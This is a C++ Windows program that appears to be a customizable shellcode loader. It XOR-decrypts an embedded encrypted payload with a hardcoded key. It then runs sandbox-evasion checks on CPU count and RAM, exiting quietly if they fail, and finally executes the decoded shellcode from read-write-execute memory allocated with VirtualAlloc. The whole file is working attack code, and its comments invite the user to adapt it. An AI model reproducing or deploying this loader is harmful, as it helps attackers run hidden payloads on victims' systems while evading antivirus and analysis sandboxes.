#include <windows.h>
#include <iostream>


//////////////////////////////////////////////////////////////////////////////////
//							GOOOO
//////////////////////////////////////////////////////////////////////////////////

int main(int argc, char **argv) {

	/////////////////////////////// Shellcode data //////////////////////////////
	// Fill in according to what was done in Preparation above
	char encryptedShellcode[] = "\x91\x31\xe8\x81\x89\x8c\xa5\x6c\x65\x73\x31\x30\x22\x35\x3f\x28\x3d\x2d\x48\xb6\x00\x24\xee\x21\x10\x29\xe8\x37\x75\x31\xe0\x37\x59\x2c\xee\x1e\x35\x3b\x7f\xd6\x29\x2f\x20\x48\xa2\x2d\x48\xa4\xc9\x50\x04\x0f\x72\x4d\x43\x24\xac\xb0\x66\x24\x78\xa5\x87\x81\x37\x32\x21\x29\xe8\x37\x4d\xf2\x29\x59\x31\x65\xb5\xe7\xe5\xfb\x70\x61\x63\x2d\xe8\xb9\x1f\x02\x31\x65\xb5\x3c\xee\x3b\x68\x25\xe8\x25\x4d\x30\x6a\xb5\x9a\x32\x2d\x93\xac\x32\xfb\x55\xeb\x2d\x6c\xaf\x26\x54\xb0\x2c\x54\xac\xc9\x32\xb1\xa8\x6e\x24\x6c\xb8\x53\x85\x0c\x95\x29\x6f\x29\x57\x78\x24\x5a\xb4\x18\xa1\x33\x21\xf2\x24\x41\x25\x64\xa3\x16\x20\xe8\x69\x25\x3d\xe0\x25\x65\x2d\x64\xbc\x24\xf8\x74\xe9\x2b\x64\xbd\x38\x33\x24\x21\x3a\x3c\x36\x24\x2b\x31\x38\x22\x3f\x25\xfa\x87\x45\x38\x36\x9a\x8c\x3d\x32\x29\x3b\x2b\xee\x7f\x90\x3c\x9a\x86\x9b\x38\x24\xdf\x72\x70\x61\x63\x65\x6d\x79\x6b\x2d\xf4\xe9\x64\x6d\x65\x73\x31\xdb\x52\xee\x02\xfe\x94\xb0\xc2\x94\xd0\xce\x33\x32\xca\xc7\xf6\xd8\xf0\x86\xbe\x2d\xfa\xa0\x4d\x50\x63\x0f\x7a\xe1\x98\x85\x18\x7c\xd0\x22\x6a\x16\x0a\x06\x65\x2a\x31\xe8\xb9\x9a\xb8\x1a\x0a\x09\x1a\x4a\x00\x14\x00\x73";
	char key[] = "mykeydelespace";
	char cipherType[] = "xor";

	// Char array to host the deciphered shellcode
	char shellcode[sizeof encryptedShellcode];	
	


	/////////////////////////////// XOR decoding ////////////////////////////// 
	int j = 0;
	for (int i = 0; i < sizeof encryptedShellcode; i++) {
		if (j == sizeof key - 1) j = 0;
		shellcode[i] = encryptedShellcode[i] ^ key[j];
		j++;
	}
	
	
	
    //////////////////////////// SANDBOX EVASION //////////////////////////////
	// Identify how processors are there and quit if there are less than 4
	int minprocs = 4;   // Change number of CPUs here if needed
	SYSTEM_INFO sysinfo;
	GetSystemInfo(&sysinfo);
	int numprocs = sysinfo.dwNumberOfProcessors;
	if (numprocs < minprocs) {
		exit(0);
	}
	//std::cout << numprocs << ": number of processes";
	
	// Check if < 5GB RAM
	MEMORYSTATUSEX totram;
	totram.dwLength = sizeof(totram);
	GlobalMemoryStatusEx(&totram);
	if ((float)totram.ullTotalPhys / 1073741824 < 5) { // Change 5 for more or less than 5GB
		exit(0);
	}
	//std::cout << (float)totram.ullTotalPhys / 1073741824 << ": RAM quantity";
	
	

	///////////////////////// Allocate, Write, Execute ////////////////////////
	// Allocating memory with EXECUTE writes
	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Copying deciphered shellcode into memory as a function
	memcpy(exec, shellcode, sizeof shellcode);

	// Call the shellcode
	((void(*)())exec)();
}
